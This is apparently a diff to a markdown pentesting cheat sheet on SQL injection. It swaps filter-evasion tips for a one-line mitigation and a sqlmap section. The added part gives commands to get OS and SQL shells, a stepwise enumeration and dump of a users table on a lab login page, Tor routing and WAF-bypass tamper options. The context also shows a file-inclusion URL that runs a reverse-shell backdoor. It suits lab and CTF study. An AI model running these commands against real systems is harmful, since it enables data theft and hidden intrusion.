@@ -67,18 +67,45 @@ IF(0,name,age)
   - Run backdoor
     - ```10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php```
 
-- Tips
-  - TRUE statements
-    - ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1``` 
-  - FALSE statements
-    - ```dNd 0=1``` & ```anD 9=2``` & ```ordEr bY 1000000000000```   
-  - Spaces
-    - ```+``` & ```/**/``` & ```%20``` 
-    - ```orDeR bY 1 can be re-written as``` => ```orDer+bY+1``` or ```orDer/**/bY/**/1``` or ```orDer%20bY%201```
-  - Comments to end the quries
-    - ```/*``` & ```//``` & ```#``` & ```%23```
-    - Sometimes you might need to add ';' before the comment
-      - ```anD 1=1//``` => ```anD 1=1;//```
+## Mitigation
+- Use parametrized statements, separate data from sql code
 
-## Tool
-[SQLMAP](../Tools/sqlmap.md)
+
+## SQLMAP
+- Commands
+  - ```sqlmap --help```
+  - ```sqlmap -u [target url]```
+  - ```sqlmap -u [target url] --os-shell```
+  - ```sqlmap -u [target url] --sql-shell```
+
+- Login page
+```
+sqlmap -u https://admin-portal.htb/login.php --form --dbs
+sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass"
+sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" --dbs
+sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin --tables
+sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --columns
+sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --dump
+```
+
+- Advanced Switches
+  - Level
+    - ```--dbs --level 5```
+  - Risk
+    - ```--risk 3```
+  - POST 
+    - ```sqlmap -u “http://testfire.net/login.jsp” --form --dbs``` 
+  - Technique
+    - ```techniques=B --dbs```
+    - ```B``` => Blind Boolean
+    - ```T``` => Blind Time-based
+    - ```E``` => Error-based
+    - ```U``` => Union
+  - Tor
+    - ```--tor```
+  - Shell
+    - ```sqlmap -u “...” --sql-shell```
+    - ```sqlmap -u “...” --os-shell```
+  - WAF Bypass 
+    - Path: /usr/share/sqlmap/tamper 
+    - ```--tamper=space2dash, hex2char --dbs```
